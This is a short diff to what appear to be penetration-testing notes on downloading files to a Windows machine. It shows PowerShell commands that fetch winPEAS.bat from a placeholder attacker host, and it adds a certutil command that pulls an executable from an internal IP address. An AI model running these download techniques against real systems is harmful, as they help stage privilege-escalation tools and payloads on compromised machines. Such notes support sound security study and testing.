@@ -40,6 +40,7 @@ windows download
 ```
 powershell -command "invoke-webrequest -Uri 'http://ATTACKER_IP/winPEAS.bat' -OutFile winpeas.bat"
 invoke-webrequest -Uri 'http://ATTACKER_IP/winPEAS.bat' -OutFile winpeas.bat
+cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/pro.exe pro.exe
 ```
 
 #### httpsrv.py
